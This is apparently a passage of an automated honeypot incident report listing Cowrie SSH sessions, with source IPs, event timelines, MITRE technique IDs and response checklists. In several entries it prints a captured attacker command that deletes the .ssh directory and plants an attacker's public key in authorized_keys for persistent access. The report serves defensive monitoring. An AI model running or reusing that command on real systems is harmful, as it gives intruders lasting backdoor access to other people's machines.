| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:54:02` | `cowrie.session.connect` |
| `2026-08-04 10:54:02` | `cowrie.client.version` |
| `2026-08-04 10:54:03` | `cowrie.client.kex` |
| `2026-08-04 10:54:03` | `cowrie.login.success` |
| `2026-08-04 10:54:04` | `cowrie.session.params` |
| `2026-08-04 10:54:04` | `cowrie.command.input` |
| `2026-08-04 10:54:04` | `cowrie.command.failed` |
| `2026-08-04 10:54:05` | `cowrie.log.closed` |
| `2026-08-04 10:54:06` | `cowrie.session.params` |
| `2026-08-04 10:54:06` | `cowrie.command.input` |
| `2026-08-04 10:54:06` | `cowrie.session.file_download` |
| `2026-08-04 10:54:06` | `cowrie.log.closed` |
| `2026-08-04 10:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.121[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.38.121[.]186` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54c19796ea3c

| Field | Detail |
|---|---|
| **Source IP** | `209.38.121[.]186` |
| **First Seen** | 2026-08-04 10:54 |
| **Last Seen** | 2026-08-04 10:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:54:06` | `cowrie.session.connect` |
| `2026-08-04 10:54:06` | `cowrie.client.version` |
| `2026-08-04 10:54:07` | `cowrie.client.kex` |
| `2026-08-04 10:54:08` | `cowrie.login.success` |
| `2026-08-04 10:54:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.121[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.38.121[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7710c113f34

| Field | Detail |
|---|---|
| **Source IP** | `209.38.121[.]186` |
| **First Seen** | 2026-08-04 10:54 |
| **Last Seen** | 2026-08-04 10:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:54:08` | `cowrie.session.connect` |
| `2026-08-04 10:54:08` | `cowrie.client.version` |
| `2026-08-04 10:54:08` | `cowrie.client.kex` |
| `2026-08-04 10:54:09` | `cowrie.login.success` |
| `2026-08-04 10:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.121[.]186` to AbuseIPDB if not already reported
- [ ] Block `209.38.121[.]186` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d02f46e0590

| Field | Detail |
|---|---|
| **Source IP** | `159.203.83[.]195` |
| **First Seen** | 2026-08-04 10:58 |
| **Last Seen** | 2026-08-04 10:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:58:08` | `cowrie.session.connect` |
| `2026-08-04 10:58:08` | `cowrie.client.version` |
| `2026-08-04 10:58:08` | `cowrie.client.kex` |
| `2026-08-04 10:58:08` | `cowrie.login.success` |
| `2026-08-04 10:58:09` | `cowrie.session.params` |
| `2026-08-04 10:58:09` | `cowrie.command.input` |
| `2026-08-04 10:58:09` | `cowrie.command.failed` |
| `2026-08-04 10:58:09` | `cowrie.log.closed` |
| `2026-08-04 10:58:10` | `cowrie.session.params` |
| `2026-08-04 10:58:10` | `cowrie.command.input` |
| `2026-08-04 10:58:10` | `cowrie.session.file_download` |
| `2026-08-04 10:58:10` | `cowrie.log.closed` |
| `2026-08-04 10:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.83[.]195` to AbuseIPDB if not already reported
- [ ] Block `159.203.83[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-095abc6293da

| Field | Detail |
|---|---|
| **Source IP** | `159.203.83[.]195` |
| **First Seen** | 2026-08-04 10:58 |
| **Last Seen** | 2026-08-04 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:58:10` | `cowrie.session.connect` |
| `2026-08-04 10:58:10` | `cowrie.client.version` |
| `2026-08-04 10:58:10` | `cowrie.client.kex` |
| `2026-08-04 10:58:10` | `cowrie.login.success` |
| `2026-08-04 10:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.83[.]195` to AbuseIPDB if not already reported
- [ ] Block `159.203.83[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78ba3487bfd6

| Field | Detail |
|---|---|
| **Source IP** | `159.203.83[.]195` |
| **First Seen** | 2026-08-04 10:58 |
| **Last Seen** | 2026-08-04 10:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 10:58:10` | `cowrie.session.connect` |
| `2026-08-04 10:58:10` | `cowrie.client.version` |
| `2026-08-04 10:58:10` | `cowrie.client.kex` |
| `2026-08-04 10:58:10` | `cowrie.login.success` |
| `2026-08-04 10:58:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.203.83[.]195` to AbuseIPDB if not already reported
- [ ] Block `159.203.83[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7c7dd989469

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 11:02 |
| **Last Seen** | 2026-08-04 11:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:02:56` | `cowrie.session.connect` |
| `2026-08-04 11:02:56` | `cowrie.client.version` |
| `2026-08-04 11:02:56` | `cowrie.client.kex` |
| `2026-08-04 11:02:57` | `cowrie.login.success` |
| `2026-08-04 11:02:57` | `cowrie.direct-tcpip.request` |
| `2026-08-04 11:02:57` | `cowrie.direct-tcpip.data` |
| `2026-08-04 11:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81ca370aa821

| Field | Detail |
|---|---|
| **Source IP** | `117.50.218[.]37` |
| **First Seen** | 2026-08-04 11:10 |
| **Last Seen** | 2026-08-04 11:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:10:13` | `cowrie.session.connect` |
| `2026-08-04 11:10:13` | `cowrie.client.version` |
| `2026-08-04 11:10:13` | `cowrie.client.kex` |
| `2026-08-04 11:10:14` | `cowrie.login.success` |
| `2026-08-04 11:10:15` | `cowrie.session.params` |
| `2026-08-04 11:10:15` | `cowrie.command.input` |
| `2026-08-04 11:10:16` | `cowrie.log.closed` |
| `2026-08-04 11:10:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.50.218[.]37` to AbuseIPDB if not already reported
- [ ] Block `117.50.218[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c02b52db650a

| Field | Detail |
|---|---|
| **Source IP** | `156.238.86[.]2` |
| **First Seen** | 2026-08-04 11:14 |
| **Last Seen** | 2026-08-04 11:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:14:40` | `cowrie.session.connect` |
| `2026-08-04 11:14:41` | `cowrie.client.version` |
| `2026-08-04 11:14:41` | `cowrie.client.kex` |
| `2026-08-04 11:14:42` | `cowrie.login.success` |
| `2026-08-04 11:14:43` | `cowrie.direct-tcpip.request` |
| `2026-08-04 11:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.238.86[.]2` to AbuseIPDB if not already reported
- [ ] Block `156.238.86[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6737eb6efdd

| Field | Detail |
|---|---|
| **Source IP** | `112.54.222[.]23` |
| **First Seen** | 2026-08-04 11:17 |
| **Last Seen** | 2026-08-04 11:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:17:04` | `cowrie.session.connect` |
| `2026-08-04 11:17:04` | `cowrie.client.version` |
| `2026-08-04 11:17:05` | `cowrie.client.kex` |
| `2026-08-04 11:17:07` | `cowrie.login.success` |
| `2026-08-04 11:17:08` | `cowrie.session.params` |
| `2026-08-04 11:17:08` | `cowrie.command.input` |
| `2026-08-04 11:17:08` | `cowrie.log.closed` |
| `2026-08-04 11:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.54.222[.]23` to AbuseIPDB if not already reported
- [ ] Block `112.54.222[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78f0d845f759

| Field | Detail |
|---|---|
| **Source IP** | `222.99.52[.]202` |
| **First Seen** | 2026-08-04 11:17 |
| **Last Seen** | 2026-08-04 11:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:17:31` | `cowrie.session.connect` |
| `2026-08-04 11:17:32` | `cowrie.client.version` |
| `2026-08-04 11:17:32` | `cowrie.client.kex` |
| `2026-08-04 11:17:34` | `cowrie.login.success` |
| `2026-08-04 11:17:35` | `cowrie.direct-tcpip.request` |
| `2026-08-04 11:17:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.99.52[.]202` to AbuseIPDB if not already reported
- [ ] Block `222.99.52[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83089b9bc05c

| Field | Detail |
|---|---|
| **Source IP** | `89.203.142[.]96` |
| **First Seen** | 2026-08-04 11:17 |
| **Last Seen** | 2026-08-04 11:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:17:40` | `cowrie.session.connect` |
| `2026-08-04 11:17:40` | `cowrie.client.version` |
| `2026-08-04 11:17:40` | `cowrie.client.kex` |
| `2026-08-04 11:17:41` | `cowrie.login.success` |
| `2026-08-04 11:17:41` | `cowrie.direct-tcpip.request` |
| `2026-08-04 11:17:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.203.142[.]96` to AbuseIPDB if not already reported
- [ ] Block `89.203.142[.]96` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8061421027c8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 11:18 |
| **Last Seen** | 2026-08-04 11:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:18:45` | `cowrie.session.connect` |
| `2026-08-04 11:18:45` | `cowrie.client.version` |
| `2026-08-04 11:18:45` | `cowrie.client.kex` |
| `2026-08-04 11:18:45` | `cowrie.login.success` |
| `2026-08-04 11:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20817747f7ce

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 11:18 |
| **Last Seen** | 2026-08-04 11:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:18:45` | `cowrie.session.connect` |
| `2026-08-04 11:18:45` | `cowrie.client.version` |
| `2026-08-04 11:18:45` | `cowrie.client.kex` |
| `2026-08-04 11:18:45` | `cowrie.login.success` |
| `2026-08-04 11:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30914d314a54

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 11:18 |
| **Last Seen** | 2026-08-04 11:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:18:54` | `cowrie.session.connect` |
| `2026-08-04 11:18:54` | `cowrie.client.version` |
| `2026-08-04 11:18:54` | `cowrie.client.kex` |
| `2026-08-04 11:18:54` | `cowrie.login.success` |
| `2026-08-04 11:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69ed6c9d5eab

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 11:18 |
| **Last Seen** | 2026-08-04 11:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:18:54` | `cowrie.session.connect` |
| `2026-08-04 11:18:54` | `cowrie.client.version` |
| `2026-08-04 11:18:54` | `cowrie.client.kex` |
| `2026-08-04 11:18:54` | `cowrie.login.success` |
| `2026-08-04 11:18:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8352f98f727

| Field | Detail |
|---|---|
| **Source IP** | `217.150.37[.]249` |
| **First Seen** | 2026-08-04 11:22 |
| **Last Seen** | 2026-08-04 11:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:22:46` | `cowrie.session.connect` |
| `2026-08-04 11:22:46` | `cowrie.client.version` |
| `2026-08-04 11:22:46` | `cowrie.client.kex` |
| `2026-08-04 11:22:48` | `cowrie.login.success` |
| `2026-08-04 11:22:48` | `cowrie.direct-tcpip.request` |
| `2026-08-04 11:22:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.150.37[.]249` to AbuseIPDB if not already reported
- [ ] Block `217.150.37[.]249` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20b6c2a8fb54

| Field | Detail |
|---|---|
| **Source IP** | `61.143.227[.]17` |
| **First Seen** | 2026-08-04 11:23 |
| **Last Seen** | 2026-08-04 11:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:23:34` | `cowrie.session.connect` |
| `2026-08-04 11:23:35` | `cowrie.client.version` |
| `2026-08-04 11:23:35` | `cowrie.client.kex` |
| `2026-08-04 11:23:37` | `cowrie.login.success` |
| `2026-08-04 11:23:38` | `cowrie.direct-tcpip.request` |
| `2026-08-04 11:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.143.227[.]17` to AbuseIPDB if not already reported
- [ ] Block `61.143.227[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2283a53bbcbb

| Field | Detail |
|---|---|
| **Source IP** | `190.123.46[.]136` |
| **First Seen** | 2026-08-04 11:43 |
| **Last Seen** | 2026-08-04 11:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:43:44` | `cowrie.session.connect` |
| `2026-08-04 11:43:44` | `cowrie.client.version` |
| `2026-08-04 11:43:44` | `cowrie.client.kex` |
| `2026-08-04 11:43:44` | `cowrie.login.success` |
| `2026-08-04 11:43:45` | `cowrie.session.params` |
| `2026-08-04 11:43:45` | `cowrie.command.input` |
| `2026-08-04 11:43:45` | `cowrie.command.failed` |
| `2026-08-04 11:43:45` | `cowrie.log.closed` |
| `2026-08-04 11:43:46` | `cowrie.session.params` |
| `2026-08-04 11:43:46` | `cowrie.command.input` |
| `2026-08-04 11:43:46` | `cowrie.session.file_download` |
| `2026-08-04 11:43:46` | `cowrie.log.closed` |
| `2026-08-04 11:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.123.46[.]136` to AbuseIPDB if not already reported
- [ ] Block `190.123.46[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f75c1a2ec422

| Field | Detail |
|---|---|
| **Source IP** | `190.123.46[.]136` |
| **First Seen** | 2026-08-04 11:43 |
| **Last Seen** | 2026-08-04 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:43:46` | `cowrie.session.connect` |
| `2026-08-04 11:43:46` | `cowrie.client.version` |
| `2026-08-04 11:43:46` | `cowrie.client.kex` |
| `2026-08-04 11:43:46` | `cowrie.login.success` |
| `2026-08-04 11:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.123.46[.]136` to AbuseIPDB if not already reported
- [ ] Block `190.123.46[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-200c0eb2fddb

| Field | Detail |
|---|---|
| **Source IP** | `190.123.46[.]136` |
| **First Seen** | 2026-08-04 11:43 |
| **Last Seen** | 2026-08-04 11:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:43:47` | `cowrie.session.connect` |
| `2026-08-04 11:43:47` | `cowrie.client.version` |
| `2026-08-04 11:43:47` | `cowrie.client.kex` |
| `2026-08-04 11:43:47` | `cowrie.login.success` |
| `2026-08-04 11:43:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.123.46[.]136` to AbuseIPDB if not already reported
- [ ] Block `190.123.46[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fab02df62b5

| Field | Detail |
|---|---|
| **Source IP** | `130.12.182[.]224` |
| **First Seen** | 2026-08-04 11:51 |
| **Last Seen** | 2026-08-04 11:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:51:54` | `cowrie.session.connect` |
| `2026-08-04 11:51:54` | `cowrie.client.version` |
| `2026-08-04 11:51:54` | `cowrie.client.kex` |
| `2026-08-04 11:51:54` | `cowrie.login.success` |
| `2026-08-04 11:51:54` | `cowrie.direct-tcpip.request` |
| `2026-08-04 11:51:55` | `cowrie.direct-tcpip.data` |
| `2026-08-04 11:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.182[.]224` to AbuseIPDB if not already reported
- [ ] Block `130.12.182[.]224` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f01459668f28

| Field | Detail |
|---|---|
| **Source IP** | `122.160.15[.]31` |
| **First Seen** | 2026-08-04 11:52 |
| **Last Seen** | 2026-08-04 11:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:52:19` | `cowrie.session.connect` |
| `2026-08-04 11:52:20` | `cowrie.client.version` |
| `2026-08-04 11:52:20` | `cowrie.client.kex` |
| `2026-08-04 11:52:22` | `cowrie.login.success` |
| `2026-08-04 11:52:23` | `cowrie.direct-tcpip.request` |
| `2026-08-04 11:52:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.15[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.15[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a39f72f72a04

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]58` |
| **First Seen** | 2026-08-04 11:52 |
| **Last Seen** | 2026-08-04 11:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 11:52:29` | `cowrie.session.connect` |
| `2026-08-04 11:52:29` | `cowrie.client.version` |
| `2026-08-04 11:52:29` | `cowrie.client.kex` |
| `2026-08-04 11:52:30` | `cowrie.login.success` |
| `2026-08-04 11:52:31` | `cowrie.direct-tcpip.request` |
| `2026-08-04 11:52:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]58` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a28519d93b2

| Field | Detail |
|---|---|
| **Source IP** | `202.138.229[.]190` |
| **First Seen** | 2026-08-04 11:57 |
| **Last Seen** | 2026-08-04 11:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

